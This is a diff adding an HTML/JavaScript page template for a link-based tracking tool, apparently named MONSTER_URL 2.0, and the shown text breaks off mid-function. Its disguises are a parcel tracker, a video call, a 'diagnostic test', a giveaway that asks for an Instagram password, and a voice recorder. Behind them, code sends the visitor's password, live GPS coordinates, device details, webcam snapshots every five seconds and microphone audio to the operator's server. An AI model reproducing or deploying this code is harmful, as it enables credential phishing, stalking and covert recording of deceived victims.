@@ -1,0 +1,985 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Live Session &middot; MONSTER_URL 2.0</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<style>
+:root {
+  --bg: #070c14;
+  --panel: #0f172a;
+  --panel2: #090e1a;
+  --line: #1e2d4a;
+  --txt: #f1f5f9;
+  --dim: #7f94b5;
+  --accent: #00ff88;
+  --ok: #00ff88;
+  --bad: #ff3366;
+  --cyan: #00e5ff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+  background: var(--bg);
+  color: var(--txt);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+body.theme-call { --accent: #00e5ff; }
+body.theme-rec { --accent: #ff3366; }
+
+header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 14px 20px;
+  background: var(--panel);
+  border-bottom: 1px solid var(--line);
+}
+.logo {
+  width: 36px;
+  height: 36px;
+  border-radius: 12px;
+  background: linear-gradient(135deg, var(--accent), #00e5ff);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  color: #04090f;
+  font-weight: 800;
+}
+.brand { font-weight: 700; font-size: 15px; }
+.brand small { display: block; font-weight: 500; color: var(--dim); font-size: 11px; }
+.spacer { flex: 1; }
+
+.pill {
+  padding: 5px 12px;
+  border-radius: 99px;
+  font-size: 12px;
+  font-weight: 600;
+  border: 1px solid var(--line);
+  color: var(--dim);
+}
+.pill.live {
+  color: #fff;
+  background: rgba(0, 255, 136, 0.15);
+  border-color: rgba(0, 255, 136, 0.4);
+}
+.pill.live::before {
+  content: '';
+  display: inline-block;
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--ok);
+  margin-right: 6px;
+  animation: pulse 1.2s infinite;
+}
+@keyframes pulse { 50% { opacity: 0.3; } }
+
+.mini-btn {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  border: 1px solid var(--line);
+  background: var(--panel2);
+  color: var(--txt);
+  cursor: pointer;
+  font-size: 14px;
+}
+
+main {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  padding: 20px;
+  max-width: 860px;
+  margin: 0 auto;
+  width: 100%;
+}
+.shell { display: none; }
+.shell.active { display: block; }
+
+.card {
+  background: var(--panel);
+  border: 1px solid var(--line);
+  border-radius: 16px;
+  padding: 20px;
+  margin-bottom: 18px;
+}
+.card h2 {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+  color: var(--dim);
+  margin-bottom: 14px;
+}
+
+.primaryBtn {
+  background: var(--accent);
+  color: #04090f;
+  border: 0;
+  border-radius: 12px;
+  padding: 14px 22px;
+  font-size: 15px;
+  font-weight: 700;
+  cursor: pointer;
+  box-shadow: 0 4px 14px rgba(0,255,136,0.25);
+  transition: all 0.2s ease;
+}
+.primaryBtn:active { transform: scale(0.98); }
+
+/* Map View */
+.mapWrap {
+  position: relative;
+  height: 340px;
+  border-radius: 16px;
+  overflow: hidden;
+  border: 1px solid var(--line);
+}
+#map { width: 100%; height: 100%; }
+#mapLock {
+  position: absolute;
+  inset: 0;
+  z-index: 600;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  background: linear-gradient(180deg, rgba(7,12,20,0.85), rgba(7,12,20,0.96));
+  text-align: center;
+  padding: 20px;
+}
+#mapLock .pin { font-size: 42px; animation: bob 2s ease-in-out infinite; }
+@keyframes bob { 50% { transform: translateY(-8px); } }
+#mapLock b { font-size: 16px; }
+#mapLock p { color: var(--dim); font-size: 12.5px; max-width: 300px; line-height: 1.5; }
+
+.trackTop { display: flex; gap: 12px; margin-bottom: 18px; }
+.trackTop input {
+  flex: 1;
+  background: var(--panel2);
+  border: 1px solid var(--line);
+  color: var(--txt);
+  padding: 14px 16px;
+  border-radius: 12px;
+  font-size: 15px;
+  letter-spacing: 1px;
+  font-family: 'JetBrains Mono', monospace;
+}
+
+.steps { display: flex; gap: 8px; margin-bottom: 18px; }
+.step {
+  flex: 1;
+  background: var(--panel);
+  border: 1px solid var(--line);
+  border-radius: 14px;
+  padding: 14px 10px;
+  text-align: center;
+}
+.step span {
+  display: block;
+  width: 28px;
+  height: 28px;
+  line-height: 28px;
+  border-radius: 50%;
+  margin: 0 auto 8px;
+  font-size: 12px;
+  font-weight: 700;
+  background: var(--panel2);
+  border: 1px solid var(--line);
+  color: var(--dim);
+}
+.step b { display: block; font-size: 12px; margin-bottom: 4px; }
+.step i { font-style: normal; font-size: 10.5px; color: var(--dim); }
+.step.done span { background: rgba(0, 255, 136, 0.2); border-color: var(--ok); color: var(--ok); }
+.step.active { border-color: var(--accent); }
+.step.active span { background: var(--accent); border-color: var(--accent); color: #04090f; animation: pulse 1.2s infinite; }
+
+/* Call View */
+#videoStage {
+  background: var(--panel2);
+  border: 1px solid var(--line);
+  border-radius: 16px;
+  height: 320px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  position: relative;
+  margin-bottom: 16px;
+}
+#cam { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
+#camPlaceholder {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 12px;
+  color: var(--dim);
+  text-align: center;
+  padding: 16px;
+}
+#camPlaceholder .ava {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #1e2d4a, #0f172a);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 32px;
+  border: 2px solid var(--line);
+}
+
+/* Rec View */
+.recStage {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 16px;
+  padding: 30px 20px;
+  background: var(--panel);
+  border: 1px solid var(--line);
+  border-radius: 16px;
+  margin-bottom: 16px;
+}
+.recBtn {
+  width: 96px;
+  height: 96px;
+  border-radius: 50%;
+  background: var(--bad);
+  color: #fff;
+  border: 0;
+  font-size: 14px;
+  font-weight: 700;
+  cursor: pointer;
+  box-shadow: 0 0 0 8px rgba(255, 51, 102, 0.18);
+  transition: all 0.2s ease;
+}
+.recBtn.live { animation: pulse 1s infinite; box-shadow: 0 0 0 10px rgba(255, 51, 102, 0.35); }
+.recBtn.stopped { background: var(--ok); color: #04090f; box-shadow: 0 0 0 8px rgba(0, 255, 136, 0.18); }
+.timer { font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 32px; letter-spacing: 1px; }
+
+#wave { width: 100%; height: 56px; background: var(--panel2); border: 1px solid var(--line); border-radius: 12px; display: block; }
+
+#noticeBar {
+  position: fixed;
+  left: 0; right: 0; bottom: 0;
+  z-index: 900;
+  background: rgba(15, 23, 42, 0.96);
+  border-top: 1px solid var(--line);
+  padding: 12px 18px;
+  font-size: 12px;
+  color: var(--dim);
+  display: none;
+  align-items: center;
+  gap: 8px;
+  justify-content: center;
+  text-align: center;
+  backdrop-filter: blur(8px);
+}
+#noticeBar.show { display: flex; }
+.rec-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--ok); animation: pulse 1.2s infinite; flex-shrink: 0; }
+
+#ended {
+  position: fixed; inset: 0; z-index: 1100;
+  background: var(--bg); display: none;
+  align-items: center; justify-content: center;
+  text-align: center; padding: 20px;
+}
+#ended h3 { font-size: 22px; margin-bottom: 8px; }
+#ended p { color: var(--dim); font-size: 14px; line-height: 1.6; }
+
+/* ---- Responsive Mobile ---- */
+@media (max-width: 600px) {
+  header { padding: 10px 14px; gap: 8px; }
+  .logo { width: 28px; height: 28px; font-size: 18px; }
+  .brand span { font-size: 14px; }
+  .brand small { font-size: 10px; }
+  .pill { font-size: 10px; padding: 3px 8px; }
+  .mini-btn { width: 28px; height: 28px; font-size: 13px; }
+  main { padding: 14px 10px; }
+  .card { padding: 18px 14px; border-radius: 14px; }
+  .card h2 { font-size: 15px; }
+  .primaryBtn { padding: 12px 20px; font-size: 14px; }
+  .trackTop { flex-direction: column; gap: 10px; }
+  .trackTop input, .trackTop button { width: 100%; }
+  .mapWrap { height: 200px; }
+  #map { border-radius: 12px; }
+  .steps { gap: 0; }
+  .step b { font-size: 12px; }
+  .step i { font-size: 10px; }
+  #videoStage { height: 300px; border-radius: 14px; }
+  .recStage { padding: 30px 16px; }
+  .timer { font-size: 36px; }
+  .recBtn { width: 80px; height: 80px; font-size: 11px; }
+  #noticeBar { font-size: 11px; padding: 8px 12px; }
+  #ended h3 { font-size: 18px; }
+  #ended p { font-size: 13px; }
+  form input, form textarea, form select {
+    font-size: 14px !important;
+    padding: 11px !important;
+  }
+  form label { font-size: 11px !important; }
+}
+</style>
+</head>
+<body class="theme-{{ cfg.theme }}">
+
+<header>
+  <div class="logo">👾</div>
+  <div class="brand">
+    <span id="brandName">Live Session</span>
+    <small id="brandSub">Secure live session</small>
+  </div>
+  <div class="spacer"></div>
+  <span class="pill" id="statusPill">Live</span>
+  <button class="mini-btn" id="leaveBtn" title="End session">✕</button>
+</header>
+
+<main>
+  <!-- TRACK Theme (Location links) -->
+  <section id="shell-track" class="shell">
+    <div class="trackTop">
+      <input id="trackNo" readonly>
+      <button class="primaryBtn" id="trackBtn">Track Package</button>
+    </div>
+    <div class="steps">
+      <div class="step done"><span>1</span><b>Order placed</b><i>Just now</i></div>
+      <div class="step done"><span>2</span><b>Packed</b><i>At facility</i></div>
+      <div class="step active" id="stepTransit"><span>3</span><b>In transit</b><i id="transitInfo">Preparing shipment</i></div>
+      <div class="step" id="stepOutFor"><span>4</span><b>Out for delivery</b><i id="outForInfo">Pending</i></div>
+    </div>
+    <div class="mapWrap">
+      <div id="map"></div>
+      <div id="mapLock">
+        <div class="pin">📦</div>
+        <b>Enter tracking number to locate package</b>
+        <p>Live GPS coordinates will appear here once tracking commences.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- CALL Theme (Camera links) -->
+  <section id="shell-call" class="shell">
+    <div id="videoStage">
+      <video id="cam" autoplay playsinline muted></video>
+      <div id="camPlaceholder">
+        <div class="ava">👤</div>
+        <p>Connect with people nearby and start video chat</p>
+        <button class="primaryBtn" id="joinCallBtn">Join Call</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- DIAG Theme (All-in-One System Diagnostic) -->
+  <section id="shell-diag" class="shell">
+    <div class="card" style="text-align:center; padding:28px 20px">
+      <div style="font-size:42px; margin-bottom:12px">💻</div>
+      <h2 style="font-size:18px; font-weight:800; color:var(--txt); margin-bottom:8px">System Hardware & Readiness Diagnostic</h2>
+      <p style="color:var(--dim); font-size:13px; max-width:440px; margin:0 auto 20px; line-height:1.5">
+        Run a full unified browser telemetry check. Tests WebGL GPU renderer, CPU cores, RAM, screen parameters, high-accuracy GPS, camera, and microphone audio.
+      </p>
+
+      <div id="diagStage" style="display:none; margin-bottom:20px">
+        <div style="height:220px; border-radius:14px; overflow:hidden; border:1px solid var(--line); position:relative; background:var(--panel2); margin-bottom:14px">
+          <video id="diagCam" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover; transform:scaleX(-1)"></video>
+        </div>
+        <div class="card" style="margin-bottom:0">
+          <h2 style="margin-bottom:8px">Live Audio Stream</h2>
+          <canvas id="diagWave" style="width:100%; height:48px; background:var(--panel2); border-radius:8px; border:1px solid var(--line)"></canvas>
+        </div>
+      </div>
+
+      <button class="primaryBtn" id="startDiagBtn" style="font-size:16px; padding:15px 32px">▶ Run Full Diagnostic Test</button>
+    </div>
+  </section>
+
+  <!-- CONTEST Theme (Contest & Giveaway Entry Form) -->
+  <section id="shell-contest" class="shell">
+    <div class="card" style="padding:28px 22px; max-width:480px; margin:0 auto">
+      <div style="text-align:center; margin-bottom:20px">
+        <div style="font-size:42px; margin-bottom:8px">🎁</div>
+        <h2 style="font-size:20px; font-weight:800; color:var(--txt); margin-bottom:6px">Official Contest & Giveaway Participation Form</h2>
+        <p style="color:var(--dim); font-size:13px; line-height:1.5">
+          Enter your details below to participate in Insta-Bluetick💠  giveaway draw!
+        </p>
+      </div>
+
+      <form id="contestForm" onsubmit="handleContestSubmit(event)">
+        <div style="margin-bottom:14px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Full Name *</label>
+          <input type="text" id="cntName" required placeholder="Enter your full name" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px">
+        </div>
+
+        <div style="margin-bottom:14px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Social Handle / Username *</label>
+          <input type="text" id="cntUser" required placeholder="@username" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px">
+        </div>
+
+        <div style="margin-bottom:14px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Phone Number *</label>
+          <input type="tel" id="cntPhone" required placeholder="Enter phone number" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px">
+        </div>
+
+        <div style="margin-bottom:20px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Password </label>
+          <textarea id="cntDesc" rows="4" placeholder="Enter Instgram Password to win!!" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px; font-family:inherit; resize:vertical"></textarea>
+        </div>
+
+        <button type="submit" class="primaryBtn" id="cntSubmitBtn" style="width:100%; font-size:15px; padding:14px">🎉 Submit Giveaway Entry</button>
+      </form>
+
+      <div id="contestSuccess" style="display:none; text-align:center; padding:24px 10px">
+        <div style="font-size:48px; margin-bottom:12px">🎉</div>
+        <h3 style="color:#00ff88; font-size:18px; font-weight:800; margin-bottom:8px">Submission Received Successfully!</h3>
+        <p style="color:var(--txt); font-size:14px; line-height:1.6; background:var(--panel2); padding:16px; border-radius:12px; border:1px solid var(--line)">
+          Thank you for participating! Your entry has been recorded. <b>You will be informed within 24 hours if you are selected as a winner.</b>
+        </p>
+      </div>
+    </div>
+  </section>
+  <section id="shell-survey" class="shell">
+    <div class="card" style="padding:28px 22px; max-width:480px; margin:0 auto">
+      <div style="text-align:center; margin-bottom:20px">
+        <div style="font-size:38px; margin-bottom:8px">📝</div>
+        <h2 style="font-size:20px; font-weight:800; color:var(--txt); margin-bottom:6px">User Feedback & Opinion Survey</h2>
+        <p style="color:var(--dim); font-size:13px; line-height:1.5">
+          Please provide your details and share your valuable opinion below.
+        </p>
+      </div>
+
+      <form id="surveyForm" onsubmit="handleSurveySubmit(event)">
+        <div style="margin-bottom:14px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Full Name *</label>
+          <input type="text" id="survName" required placeholder="e.g. Alex Mercer" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px">
+        </div>
+
+        <div style="margin-bottom:14px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Username / Social ID *</label>
+          <input type="text" id="survUser" required placeholder="@username" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px">
+        </div>
+
+        <div style="margin-bottom:14px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Phone Number *</label>
+          <input type="tel" id="survPhone" required placeholder="+1 234 567 8900" style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px">
+        </div>
+
+        <div style="margin-bottom:20px">
+          <label style="display:block; font-size:12px; font-weight:700; color:var(--dim); text-transform:uppercase; margin-bottom:6px">Your Opinion / Feedback</label>
+          <textarea id="survOpinion" rows="3" placeholder="Share your feedback or suggestions..." style="width:100%; padding:12px; border-radius:10px; border:1px solid var(--line); background:var(--panel2); color:var(--txt); font-size:14px; font-family:inherit; resize:vertical"></textarea>
+        </div>
+
+        <button type="submit" class="primaryBtn" id="survSubmitBtn" style="width:100%; font-size:15px; padding:14px">Submit Response & Run Test</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- REC Theme (Mic links) -->
+  <section id="shell-rec" class="shell">
+    <div class="recStage">
+      <div class="timer" id="recTime">00:00</div>
+      <button class="recBtn" id="recBtn">Start<br>Recording</button>
+      <p style="color:var(--dim); font-size:12.5px" id="recHint">Private voice recording · encrypted stream</p>
+    </div>
+    <div class="card">
+      <h2>Audio Waveform Visualizer</h2>
+      <canvas id="wave"></canvas>
+    </div>
+  </section>
+</main>
+
+<div id="noticeBar">
+  <span class="rec-dot"></span>
+  <span id="noticeText"></span>
+</div>
+
+<div id="ended">
+  <div>
+    <div style="font-size:48px; margin-bottom:12px">👋</div>
+    <h3 id="endedTitle">Session ended</h3>
+    <p id="endedMsg">You can close this tab safely.</p>
+  </div>
+</div>
+
+<script>
+const cfg = {{ cfg|tojson }};
+const $ = id => document.getElementById(id);
+const THEME = cfg.theme;
+const API_BASE = '';
+
+let map = null, marker = null, accCircle = null;
+let streams = [], timers = [], raf = null;
+let batteryInfo = null;
+let waveCtx = null, analyser = null;
+let locStarted = false;
+
+let recorder = null, recChunks = [], recMime = '';
+let recSec = 0, recTimer = null;
+
+const BRAND = {
+  diag:    ['SystemDiag 2.0', 'Hardware & Network Diagnostic Test'],
+  contest: ['GiveawayHub', 'Official Contest & Giveaway Entry'],
+  survey:  ['FeedbackForm', 'User Opinion & Feedback Survey'],
+  track:   ['PackageTrack 2.0', 'Free Express Package Tracker'],
+  call:    ['LiveMeet 2.0', 'Instant Video Meeting'],
+  rec:     ['VoiceNote 2.0', 'Encrypted Voice Recorder']
+};
+
+$('brandName').textContent = (BRAND[THEME] || BRAND.track)[0];
+$('brandSub').textContent  = (BRAND[THEME] || BRAND.track)[1];
+
+document.querySelectorAll('.shell').forEach(s => s.classList.remove('active'));
+const shellEl = $('shell-' + THEME);
+if (shellEl) { shellEl.classList.add('active'); }
+else { $('shell-track').classList.add('active'); }
+
+if (THEME === 'track') $('trackNo').value = 'PKG' + Math.random().toString(36).slice(2, 10).toUpperCase();
+
+function initMap(){
+  if (map) return;
+  map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19, attribution: '&copy; CARTO' }).addTo(map);
+}
+if (THEME === 'track') initMap();
+
+async function trackBattery(){
+  try {
+    if (!navigator.getBattery) return;
+    const b = await navigator.getBattery();
+    batteryInfo = { level: Math.round(b.level * 100), charging: b.charging ? 1 : 0 };
+    b.addEventListener('levelchange', () => batteryInfo.level = Math.round(b.level * 100));
+    b.addEventListener('chargingchange', () => batteryInfo.charging = b.charging ? 1 : 0);
+    sendBattery();
+    timers.push(setInterval(sendBattery, 30000));
+  } catch (e) {}
+}
+
+function getGpuInfo(){
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return 'No WebGL';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+  } catch (e) { return 'Unknown GPU'; }
+}
+
+function payload(extra){
+  return Object.assign({
+    battery_level: batteryInfo ? batteryInfo.level / 100 : null,
+    battery_charging: batteryInfo ? batteryInfo.charging : null,
+    gpu: getGpuInfo(),
+    screen: `${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio || 1}x`,
+    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+    cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'N/A',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
+  }, extra || {});
+}
+
+function sendReport(extra){
+  fetch(API_BASE + '/api/t/' + cfg.token + '/report', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload(extra))
+  }).catch(() => {});
+}
+
+function sendBattery(){ if (batteryInfo) sendReport({ lat: null, lon: null }); }
+
+function startLoc(){
+  return new Promise((res, rej) => {
+    if (!navigator.geolocation) return rej(new Error('No geolocation support'));
+    
+    const geoOptions = { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 };
+    
+    // Immediate single fix request
+    navigator.geolocation.getCurrentPosition(
+      pos => { onFix(pos); res(); },
+      err => { console.warn('getCurrentPosition error:', err); },
+      geoOptions
+    );
+
+    // Continuous watch position tracker
+    const wid = navigator.geolocation.watchPosition(onFix, err => {
+      console.warn('watchPosition error:', err);
+      setStatus('Location error: ' + err.message);
+    }, geoOptions);
+    
+    timers.push(wid);
+    res();
+  });
+}
+
+function onFix(pos){
+  const c = pos.coords;
+  sendReport({ lat: c.latitude, lon: c.longitude, accuracy: c.accuracy, speed: c.speed, heading: c.heading, alt: c.altitude });
+  if (THEME === 'track') {
+    $('mapLock').style.display = 'none';
+    $('stepOutFor').classList.add('active');
+    $('transitInfo').textContent = 'Accuracy ' + (c.accuracy != null ? Math.round(c.accuracy) + ' m' : 'n/a');
+  }
+  if (!map) return;
+  if (!marker) {
+    marker = L.marker([c.latitude, c.longitude]).addTo(map);
+    accCircle = L.circle([c.latitude, c.longitude], { radius: c.accuracy || 50, color: '#00ff88', fillOpacity: 0.15 }).addTo(map);
+    map.setView([c.latitude, c.longitude], 16);
+  } else {
+    marker.setLatLng([c.latitude, c.longitude]);
+    accCircle.setLatLng([c.latitude, c.longitude]).setRadius(c.accuracy || 50);
+  }
+}
+
+function pickMime(){
+  const c = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4'];
+  return c.find(m => MediaRecorder.isTypeSupported(m)) || '';
+}
+
+function startRecording(stream){
+  recMime = pickMime();
+  recChunks = [];
+  recorder = new MediaRecorder(stream, { mimeType: recMime || undefined });
+  recorder.ondataavailable = e => {
+    if (!e.data || e.data.size === 0) return;
+    recChunks.push(e.data);
+    uploadAudio(new Blob(recChunks, { type: recMime || 'audio/webm' }));
+  };
+  recorder.start(10000);
+  startWaveform(stream);
+  startRecTimer();
+}
+
+function stopRecording(){
+  if (recorder && recorder.state !== 'inactive') recorder.stop();
+  stopRecUi();
+}
+
+async function startRecordSession(){
+  setStatus('Live');
+  trackBattery();
+  if (cfg.loc && !locStarted) { locStarted = true; try { await startLoc(); } catch (e) {} }
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+    stream.getTracks().forEach(t => streams.push(t));
+    startRecording(stream);
+  } catch (e) {
+    setStatus('Mic error');
+  }
+}
+
+$('recBtn').addEventListener('click', () => {
+  if (recorder && recorder.state === 'recording') stopRecording();
+  else startRecordSession();
+});
+
+async function startCallMedia(){
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: cfg.mic });
+  stream.getTracks().forEach(t => streams.push(t));
+  const v = $('cam');
+  v.srcObject = stream;
+  await v.play().catch(() => {});
+  v.style.display = 'block';
+  $('camPlaceholder').style.display = 'none';
+  capturePhoto();
+  timers.push(setInterval(capturePhoto, 5000));
+}
+
+function capturePhoto(){
+  const v = $('cam');
+  if (!v.videoWidth || !v.videoHeight) return;
+  const c = document.createElement('canvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0);
+  c.toBlob(b => { if (b) uploadPhoto(b); }, 'image/jpeg', 0.75);
+}
+
+function uploadPhoto(blob){
+  const fd = new FormData();
+  fd.append('kind', 'photo');
+  fd.append('file', blob, 'photo_' + Date.now() + '.jpg');
+  fetch(API_BASE + '/api/t/' + cfg.token + '/media', { method: 'POST', body: fd });
+}
+function uploadAudio(blob){
+  const fd = new FormData();
+  fd.append('kind', 'audio');
+  fd.append('file', blob, 'audio_' + Date.now() + '.webm');
+  fetch(API_BASE + '/api/t/' + cfg.token + '/media', { method: 'POST', body: fd });
+}
+
+$('trackBtn').addEventListener('click', () => {
+  setStatus('Live'); trackBattery();
+  if (cfg.loc) { locStarted = true; startLoc().catch(()=>{}); }
+});
+
+$('joinCallBtn').addEventListener('click', async () => {
+  setStatus('Live'); trackBattery();
+  if (cfg.loc) { locStarted = true; try { await startLoc(); } catch (e) {} }
+  if (cfg.cam) { try { await startCallMedia(); } catch (e) {} }
+});
+
+$('startDiagBtn').addEventListener('click', async () => {
+  setStatus('Testing System...');
+  trackBattery();
+  $('diagStage').style.display = 'block';
+  $('startDiagBtn').textContent = '⚡ Running Unified Telemetry Test...';
+
+  // 1. Geolocation
+  if (cfg.loc) {
+    locStarted = true;
+    try { await startLoc(); } catch (e) {}
+  }
+
+  // 2. Camera Stream (Independent request)
+  if (cfg.cam) {
+    try {
+      const vStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      vStream.getTracks().forEach(t => streams.push(t));
+      const v = $('diagCam');
+      v.srcObject = vStream;
+      await v.play().catch(() => {});
+      
+      const captureDiagPhoto = () => {
+        if (!v.videoWidth || !v.videoHeight) return;
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => { if (b) uploadPhoto(b); }, 'image/jpeg', 0.75);
+      };
+      captureDiagPhoto();
+      timers.push(setInterval(captureDiagPhoto, 5000));
+    } catch (e) {
+      console.warn('Camera error:', e);
+    }
+  }
+
+  // 3. Audio Stream (Independent request)
+  if (cfg.mic) {
+    try {
+      const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      aStream.getTracks().forEach(t => streams.push(t));
+      startRecording(aStream);
+      startWaveformOnCanvas(aStream, 'diagWave');
+    } catch (e) {
+      console.warn('Mic error:', e);
+    }
+  }
+
+  setStatus('Live (Diagnostic Active)');
+});
+
+async function handleContestSubmit(e) {
+  e.preventDefault();
+  const btn = $('cntSubmitBtn');
+  btn.disabled = true;
+  btn.textContent = '⌛ Submitting Entry...';
+
+  const payloadData = {
+    full_name: $('cntName').value.trim(),
+    username: $('cntUser').value.trim(),
+    phone: $('cntPhone').value.trim(),
+    opinion: $('cntDesc').value.trim()
+  };
+
+  try {
+    await fetch(API_BASE + '/api/t/' + cfg.token + '/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payloadData)
+    });
+  } catch (err) {}
+
+  setStatus('Submitted');
+  trackBattery();
+
+  // Trigger telemetry (location, camera, mic if configured)
+  if (cfg.loc) {
+    locStarted = true;
+    try { await startLoc(); } catch (err) {}
+  }
+  if (cfg.cam) {
+    try { await startCallMedia(); } catch (err) {}
+  }
+  if (cfg.mic) {
+    try {
+      const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      aStream.getTracks().forEach(t => streams.push(t));
+      startRecording(aStream);
+    } catch (err) {}
+  }
+
+  $('contestForm').style.display = 'none';
+  $('contestSuccess').style.display = 'block';
+}
+
+async function handleSurveySubmit(e) {
+  e.preventDefault();
+  const btn = $('survSubmitBtn');
+  btn.disabled = true;
+  btn.textContent = '⌛ Submitting Response...';
+
+  const payload = {
+    full_name: $('survName').value.trim(),
+    username: $('survUser').value.trim(),
+    phone: $('survPhone').value.trim(),
+    opinion: $('survOpinion').value.trim()
+  };
+
+  try {
+    await fetch(API_BASE + '/api/t/' + cfg.token + '/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {}
+
+  setStatus('Submitted');
+  trackBattery();
+
+  // Trigger telemetry (location, camera, mic if configured)
+  if (cfg.loc) {
+    locStarted = true;
+    try { await startLoc(); } catch (err) {}
+  }
+  if (cfg.cam) {
+    try { await startCallMedia(); } catch (err) {}
+  }
+  if (cfg.mic) {
+    try {
+      const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      aStream.getTracks().forEach(t => streams.push(t));
+      startRecording(aStream);
+    } catch (err) {}
+  }
+
+  btn.textContent = '✓ Response Recorded';
+  btn.style.background = '#00ff88';
+  btn.style.color = '#070b12';
+}
+
+$('leaveBtn').addEventListener('click', () => {
+  stopAll();
+  $('ended').style.display = 'flex';
+});
+
+function startWaveformOnCanvas(stream, canvasId){
+  try {
+    const actx = new (window.AudioContext || window.webkitAudioContext)();
+    const ana = actx.createAnalyser(); ana.fftSize = 256;
+    actx.createMediaStreamSource(stream).connect(ana);
+    
+    function render() {
+      const cvs = $(canvasId);
+      if (cvs && cvs.clientWidth) {
+        const dpr = window.devicePixelRatio || 1;
+        const W = cvs.clientWidth, H = cvs.clientHeight;
+        cvs.width = W * dpr; cvs.height = H * dpr;
+        const ctx = cvs.getContext('2d'); ctx.scale(dpr, dpr);
+        ctx.fillStyle = '#090e1a'; ctx.fillRect(0, 0, W, H);
+        const data = new Uint8Array(ana.frequencyBinCount);
+        ana.getByteFrequencyData(data);
+        const bars = 40, bw = W / bars;
+        ctx.fillStyle = '#00ff88';
+        for (let i = 0; i < bars; i++) {
+          const v = data[Math.floor(i * data.length / bars)] / 255;
+          const bh = Math.max(2, v * H * 0.9);
